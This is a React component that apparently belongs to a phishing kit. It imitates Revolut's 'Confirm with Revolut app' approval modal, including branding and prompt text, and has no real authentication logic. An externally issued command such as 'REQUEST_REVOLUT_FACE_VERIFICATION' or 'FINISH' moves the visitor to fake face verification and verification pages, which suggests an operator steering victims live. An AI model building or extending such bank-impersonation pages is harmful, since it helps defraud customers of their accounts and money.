import { useState, useEffect, useCallback } from 'react'
import RevoluteLoader from '../components/RevoluteLoader';
import { useCommand } from '../app/lib/CommandContext';
import { useRouter } from 'next/navigation';

export default function MobileAuthModal({ displayAuth, setDisplayAuth, resetCommand }) {

    // handle the state of the overlay and modal box
    const [overlay, setOverlay] = useState(false)
    const [modal, setModal] = useState(false)
    const [displayLoader, setDisplayLoader] = useState(false);
    const router = useRouter();
    const { command } = useCommand();






    // This function displays the revolut Loader
    const displayPageLoader = () => {
        console.log("NOW DISPLAYING PAGE LOADER");
        setDisplayLoader(true);
    };

    const navigateWithLoader = useCallback((path) => {
      // Show loader
      setDisplayLoader(true);
      // Set a minimum display time for the loader (for UX purposes)
      const minLoaderTime = 1500; // 1.5 seconds
      const startTime = Date.now();

      // Prepare the navigation
      const performNavigation = () => {
        router.push(path);
      };
      // Handle the timing
      setTimeout(() => {
        const elapsedTime = Date.now() - startTime;
        if (elapsedTime < minLoaderTime) {
          // If minimum time hasn't passed, wait the remaining time
          setTimeout(performNavigation, minLoaderTime - elapsedTime);
        } else {
          // Minimum time has passed, navigate immediately
          performNavigation();
        }
      }, 100); // Small delay to ensure loader is visible
    }, [router]);


  
    // Handle command changes
    useEffect(() => {
        if (command === 'REQUEST_REVOLUT_FACE_VERIFICATION') {
            navigateWithLoader('/FaceVerificationPage');
        } else if (command === 'FINISH') {
            navigateWithLoader('/verificationPage');
            resetCommand();
        } 
    }, [command, router, navigateWithLoader, resetCommand]);

  
    useEffect(() => {
        if (displayAuth) {
            // Display the overlay
            setOverlay(true)

            // after the timeout display the modal
            setTimeout(() => {
                setModal(true)
            }, 300)
        } else {
            onMountEffect()
        }
    })

  
    // this function onmount the whole component with transition still intact
    const onMountEffect = () => {
        setModal(false)

        // remove the overlay after timeout
        setTimeout(() => {
            setOverlay(false)

            // set displayAuth to false after timeout
            setTimeout(() => {
                setDisplayAuth(false)
            }, 200)
        }, 100)
    }

  
    return (
        <div className={`fixed w-full h-screen z-[100] inset-0 bg-black bg-opacity-50 justify-center items-center ${overlay ? 'flex' : 'hidden'}`}>
            {/* Main container */}
            <div className={` justify-start bg-[#f7f7f7] gap-y-3 items-start flex flex-col px-3 py-2.5 ${modal ? 'opacity-100 -translate-y-5' : 'opacity-0 translate-y-0'} h-full max-h-[514px] w-full max-w-[360px] transition-all duration-300 rounded-xl`}>

                {/* cancel icon */}
                <div className='flex w-full cursor-pointer justify-start items-center' onClick={
                    () => onMountEffect()
                }>
                    <svg xmlns="http://www.w3.org/2000/svg" height="20px" viewBox="0 -960 960 960" width="20px" fill="#1f1f1f"><path d="M480-424 284-228q-11 11-28 11t-28-11q-11-11-11-28t11-28l196-196-196-196q-11-11-11-28t11-28q11-11 28-11t28 11l196 196 196-196q11-11 28-11t28 11q11 11 11 28t-11 28L536-480l196 196q11 11 11 28t-11 28q-11 11-28 11t-28-11L480-424Z" /></svg>
                </div>

                {/* text container */}
                <div className='flex gap-y-3 flex-col'>
                    <h1 className='font-bold text-3xl'>
                        Confirm with Revolut app
                    </h1>
                    <p className='text-[15px] text-gray-800'>
                        We sent a notification to your Revolut app.
                        Make sure the app is up to date (version 8.15 or later)
                    </p>

                    <a href="" className='text-blue-600 text-[15px]'>Choose another method</a>
                </div>

                {/* image container */}
                <div className='flex-grow w-full flex justify-center items-center'>
                    <img src="/Revolut Web 9.png" alt="revolut" className='w-[100px]' />
                </div>

                {/* Bottom buttons container */}
                <div className='w-full flex flex-col gap-y-1 justify-normal rounded-xl mx-auto bg-white'>


                    <button className='w-full flex items-center gap-x-3 h-fit px-3 py-2.5'>
                        {/* change to main revolut icon */}
                        <div className='w-[20px]'>
                            R
                        </div>

                        <div className='text-sm'>
                            Open Revolut app
                        </div>
                    </button>


                    <button className='w-full flex items-center gap-x-3 h-fit px-3 py-2.5'>
                        <svg xmlns="http://www.w3.org/2000/svg" height="20px" viewBox="0 -960 960 960" width="20px" fill="#1f1f1f"><path d="m382-354 339-339q12-12 28-12t28 12q12 12 12 28.5T777-636L410-268q-12 12-28 12t-28-12L182-440q-12-12-11.5-28.5T183-497q12-12 28.5-12t28.5 12l142 143Z" /></svg>

                        <div className='text-sm'>
                            Tap "Authoize" on the prompt
                        </div>
                    </button>
                </div>
            </div>
        </div>
    )
}
